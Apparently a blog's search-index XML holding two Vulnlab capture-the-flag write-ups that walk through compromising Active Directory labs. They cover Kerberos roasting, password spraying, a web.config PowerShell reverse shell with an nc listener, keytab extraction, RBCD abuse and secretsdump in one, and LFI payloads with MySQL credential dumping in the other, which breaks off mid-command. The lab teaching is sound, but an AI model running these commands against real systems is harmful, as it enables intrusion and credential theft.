<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VL-Heron</title>
      <link href="/2025/04/15/VL-Heron/"/>
      <url>/2025/04/15/VL-Heron/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>From the wiki, we obtain initial credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pentest:Heron123!</span><br></pre></td></tr></table></figure><p>Port scan reveals:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br></pre></td></tr></table></figure><h2 id="Network-Pivoting-with-Ligolo-NG"><a href="#Network-Pivoting-with-Ligolo-NG" class="headerlink" title="Network Pivoting with Ligolo-NG"></a>Network Pivoting with Ligolo-NG</h2><p>Setting up the tunnel on your attack machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user &#123;USER&#125; mode tun ligolo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set ligolo up</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name &quot;evil-cha&quot;</span><br></pre></td></tr></table></figure><p>On the Linux target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect 10.8.5.195:11601 --ignore-cert</span><br></pre></td></tr></table></figure><p>After connecting, select the session using the <code>session</code> command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tunnel_start --tun evil-cha</span><br></pre></td></tr></table></figure><p>This will add a route only for the Windows machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_add_route --name evil-cha --route HERE/32</span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Port 80 is open, and we discover several users from the Linux machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d@heron.vl  svc-web-accounting@heron.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/psooibe_users.png" alt="User list from Linux machine"><br>Additional users found:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wayne.wood@heron.vl</span><br><span class="line">julian.pratt@heron.vl</span><br><span class="line">samuel.davies@heron.vl</span><br></pre></td></tr></table></figure><h2 id="User-Enumeration-and-Authentication"><a href="#User-Enumeration-and-Authentication" class="headerlink" title="User Enumeration and Authentication"></a>User Enumeration and Authentication</h2><p>We use kerbrute to verify if the discovered users are valid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum -d heron.vl --dc 10.10.232.133 ~/Downloads/usernames.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/kerberute.png" alt="Kerbrute output"><br>It returned hashes in the <code>$18$</code> format, but hashcat uses the <code>$23$</code> format. We’ll use Impacket’s GetNPUsers to get the correct format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile ~/Downloads/usernames.txt -dc-ip &quot;10.10.232.133&quot; &quot;heron.vl&quot;/</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/23hash_formta.png" alt="Hashcat format conversion"><br>Cracking the hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash223.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/crackee_pass.png" alt="Cracked password"><br>Credentials obtained:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samuel.davies : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Enumerating SMB shares with the compromised user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/shares_sam.png" alt="SMB shares for Samuel"><br>Found GPP password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;samuel.davies&#x27; -p &#x27;&#x27; -M gpp_password</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/gpp_password.png" alt="GPP password extraction"><br>Testing credentials against SMB:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u usernames.txt -p &#x27;&lt;PASS&gt;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/new_account.png" alt="New account discovered"><br>New credentials discovered:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d:&lt;PASS&gt;</span><br></pre></td></tr></table></figure><p>Enumerating SMB shares with the new user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --shares</span><br></pre></td></tr></table></figure><p>We find we have <code>accounting$ READ,WRITE</code> privileges. Within this share, we locate a web.config file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;dotnet&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;.\AccountingApp.dll&quot;</span> <span class="attr">stdoutLogEnabled</span>=<span class="string">&quot;false&quot;</span> <span class="attr">stdoutLogFile</span>=<span class="string">&quot;.\logs\stdout&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;inprocess&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span>  </span><br></pre></td></tr></table></figure><h2 id="Web-Application-Exploitation"><a href="#Web-Application-Exploitation" class="headerlink" title="Web Application Exploitation"></a>Web Application Exploitation</h2><p>First, we add the accounting vhost to our machine and log in to <code>http://accounting.heron.vl/</code> using <code>svc-web-accounting-d</code>. We don’t find any useful information, but discover a potential new user: <code>rhys.george@heron.vl</code>.<br>For our reverse shell, I recommend using the PowerShell #3 Base64 payload from <a href="https://www.revshells.com/">revshells</a>.<br>We modify the web.config file:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">location</span> <span class="attr">path</span>=<span class="string">&quot;.&quot;</span> <span class="attr">inheritInChildApplications</span>=<span class="string">&quot;false&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;aspNetCore&quot;</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">verb</span>=<span class="string">&quot;*&quot;</span> <span class="attr">modules</span>=<span class="string">&quot;AspNetCoreModuleV2&quot;</span> <span class="attr">resourceType</span>=<span class="string">&quot;Unspecified&quot;</span> /&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">aspNetCore</span> <span class="attr">processPath</span>=<span class="string">&quot;powershell&quot;</span> <span class="attr">arguments</span>=<span class="string">&quot;-e (BASE64 PAYLOAD)&quot;</span> <span class="attr">hostingModel</span>=<span class="string">&quot;OutOfProcess&quot;</span> /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">location</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4--&gt;</span></span><br></pre></td></tr></table></figure><p>Then we create a hoaxshell and paste the base64 output in the arguments:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del web.config</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put web.config</span><br></pre></td></tr></table></figure><p>This gives us a shell as <code>svc-web-accounting</code> (set the shell to be on the jumpbox machine and not your attack machine).<br>A good idea is to use Sliver so you can use your tools to connect to the domain controller.<br>Ligolo setup:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>The shell should point at the Linux machine and address 1234, with the listener on our machine on port 4444:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>After setting everything up, refresh the page:<br><img src="/images/Heron/shell.png" alt="Shell established"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.232.133 -u &#x27;svc-web-accounting-d&#x27; -p &#x27;&lt;PASS&gt;&#x27; --bloodhound --dns-server 10.10.232.133 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/bloodhoudnpath.png" alt="BloodHound attack path"></p><h2 id="Credential-Hunting-as-svc-web-accounting"><a href="#Credential-Hunting-as-svc-web-accounting" class="headerlink" title="Credential Hunting as svc-web-accounting"></a>Credential Hunting as svc-web-accounting</h2><p><img src="/images/Heron/sshscript.png" alt="SSH script discovery"><br>Inside the ssh.ps1 file, we find:<br><img src="/images/Heron/ssh_root_pass.png" alt="SSH root password"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$plinkPath = &quot;C:\Program Files\PuTTY\plink.exe&quot;</span><br><span class="line">$targetMachine = &quot;frajmp&quot;</span><br><span class="line">$user = &quot;_local&quot;</span><br><span class="line">$password = &quot;&lt;PASS&gt;&quot;</span><br><span class="line">&amp; &quot;$plinkPath&quot; -ssh -batch $user@$targetMachine -pw $password &quot;ps auxf; ls -lah /home; exit&quot;</span><br></pre></td></tr></table></figure><p>With this new user, we have full sudo access:<br><img src="/images/Heron/full_sudo.png" alt="Full sudo access"></p><h2 id="Lateral-Movement-via-Linux-Machine"><a href="#Lateral-Movement-via-Linux-Machine" class="headerlink" title="Lateral Movement via Linux Machine"></a>Lateral Movement via Linux Machine</h2><p>As this Linux machine is domain-joined, we can extract <code>krb5.keytab</code>, which contains secrets about the machine account. We use <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> to extract those secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 keytabextract.py /etc/krb5.keytab</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/linux_machine_hash.png" alt="Linux machine hash extraction"><br>After password spraying, we get a hit on <code>julian.pratt</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.202.197 -u usernames.txt -p &#x27;&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/pass_spray.png" alt="Password spray results"><br>We gain access to his home directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.202.197/home$ -U julian.pratt </span><br></pre></td></tr></table></figure><p><img src="/images/Heron/jul_homedir.png" alt="Julian&#39;s home directory"><br>After retrieving <code>mucjmp.lnk</code> to our local machine and examining it (just run <code>cat mucjmp.lnk</code> and there should be a cleartext string with the autologin credentials), we find credentials for <code>adm_prju</code>:<br><code>adm_prju@mucjmp -pw &lt;PASS&gt;</code></p><h2 id="Domain-Admin-Privilege-Escalation"><a href="#Domain-Admin-Privilege-Escalation" class="headerlink" title="Domain Admin Privilege Escalation"></a>Domain Admin Privilege Escalation</h2><p>From our BloodHound enumeration, we discovered that <code>adm_prju</code> is in the Admins_T1 group, which has <code>WriteAccountRestrictions</code> over the DC. To exploit this, we need a machine account. Fortunately, we have compromised the Linux machine account.<br>Now we can abuse Resource-Based Constrained Delegation (RBCD):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from &#x27;FRAJMP$&#x27; -delegate-to &#x27;MUCDC$&#x27; -action &#x27;write&#x27; &#x27;heron.vl/adm_prju:&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/rbcd.png" alt="RBCD exploitation"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -spn &#x27;cifs/mucdc.heron.vl&#x27; -impersonate &#x27;_admin&#x27; &#x27;heron.vl/FRAJMP$&#x27; -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>Now we can attempt to dump all secrets through our SOCKS proxy using Impacket’s secretsdump command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy, so be patient:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k mucdc.heron.vl</span><br></pre></td></tr></table></figure><p>We tried using WinRM, but it’s disabled, so we’ll use psexec instead:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec heron.vl/&#x27;_admin&#x27;@heron.vl -hashes :&lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44">https://api.vulnlab.com/api/v1/share?id=395c9eb2-2c08-4675-9b0e-3bf0bb3c4c44</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
            <tag> Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Trusted</title>
      <link href="/2025/04/13/VL-Trusted/"/>
      <url>/2025/04/13/VL-Trusted/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Our initial port scan revealed several open ports and services on the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.53 </span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-12 19:39:41Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows </span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.53 </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3306/tcp  open  mysql         syn-ack ttl 127 MariaDB 5.5.5-10.4.24</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.4.24-MariaDB</span><br><span class="line">|   Thread ID: 9</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: SupportsTransactions, Support41Auth, FoundRows, Speaks41ProtocolNew, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolOld, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: V7M]l*(*:&#x27;O=&quot;/g&lt;2%a:</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LAB</span><br><span class="line">|   NetBIOS_Domain_Name: LAB</span><br><span class="line">|   NetBIOS_Computer_Name: LABDC</span><br><span class="line">|   DNS_Domain_Name: lab.trusted.vl</span><br><span class="line">|   DNS_Computer_Name: labdc.lab.trusted.vl</span><br><span class="line">|   DNS_Tree_Name: trusted.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-12T19:40:41+00:00</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI </span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49672/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows</span><br><span class="line">49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">57941/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58459/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The target is running a web server on port 80. I used feroxbuster to discover hidden directories:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://10.10.213.214/</span><br></pre></td></tr></table></figure><p>This revealed a <code>/dev</code> directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">301      GET        9l       30w      336c http://10.10.213.214/dev =&gt; http://10.10.213.214/dev/</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/xamoo.png" alt="Xamoo Homepage"><br><img src="/images/Trusted/manes_winchester.png" alt="Manes Winchester Page"></p><h2 id="Exploiting-Local-File-Inclusion-LFI"><a href="#Exploiting-Local-File-Inclusion-LFI" class="headerlink" title="Exploiting Local File Inclusion (LFI)"></a>Exploiting Local File Inclusion (LFI)</h2><p>Testing for LFI vulnerability:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=../</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/unsecure_file_query.png" alt="Unsecure File Query"><br>Confirming the LFI vulnerability by accessing Windows system files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=../../../../../../windows/win.ini</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/100vulnerable.png" alt="LFI Vulnerability Confirmed"><br>Using ffuf to enumerate potential files via LFI:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &quot;http://10.10.213.214/dev/index.html?view=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -e .php,.txt,.log,.ini -fl 35,33,40</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/dbfile.png" alt="DB File Found"><br>To extract the contents of the PHP file, I used a base64 filter:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.213.214/dev/index.html?view=php://filter/read=convert.base64-encode/resource=db.php</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/mongodbpass.png" alt="MongoDB Password"></p><h2 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h2><p>After decoding the base64 output, I obtained MySQL credentials:<br>root : SuperSecureMySQLPassw0rd1337.<br>Connecting to the MySQL server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.10.213.214 -u root -p --skip-ssl</span><br></pre></td></tr></table></figure><p>Enumerated the databases and tables:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br><span class="line">USE news;</span><br><span class="line">SHOW TABLES;</span><br><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure><p>Retrieved user credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">| id | first_name | short_handle | last_name | password                         |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">|  1 | Robert     | rsmith       | Smith     | 7e7abb54bbef42f0fbfa3007b368def7 |</span><br><span class="line">|  2 | Eric       | ewalters     | Walters   | d6e81aeb4df9325b502a02f11043e0ad |</span><br><span class="line">|  3 | Christine  | cpowers      | Powers    | e3d3eb0f46fe5d75eed8d11d54045a60 |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>After cracking the hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsmith : IHateEric2</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Checked for accessible SMB shares with the credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.213.214 -u rsmith -p &lt;PASS&gt; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/rsmith_shares.png" alt="RSmith Shares"><br>Other user accounts identified:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ewalters  </span><br><span class="line">cpowers</span><br></pre></td></tr></table></figure><p>No valuable content was found on the accessible shares.</p><h2 id="Active-Directory-Enumeration-with-BloodHound"><a href="#Active-Directory-Enumeration-with-BloodHound" class="headerlink" title="Active Directory Enumeration with BloodHound"></a>Active Directory Enumeration with BloodHound</h2><p>Used BloodHound to map the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.213.214 -u rsmith -p IHateEric2 --bloodhound --dns-server 10.10.213.214 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p>BloodHound revealed a bidirectional domain trust between <code>trusted.vl</code> and <code>lab.trusted.vl</code>:<br><img src="/images/Trusted/crooss_domain_trust.png" alt="Cross Domain Trust"><br>Also discovered that <code>rsmith</code> has ForceChangePassword rights over <code>ewalters</code>:<br><img src="/images/Trusted/path.png" alt="Attack Path"></p><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Exploiting the ForceChangePassword right to gain access as <code>ewalters</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host &quot;labdc.lab.trusted.vl&quot; -d &quot;lab.trusted.vl&quot; -u &quot;rsmith&quot; -p &quot;&lt;PASS&gt;&quot; set password &quot;ewalters&quot; 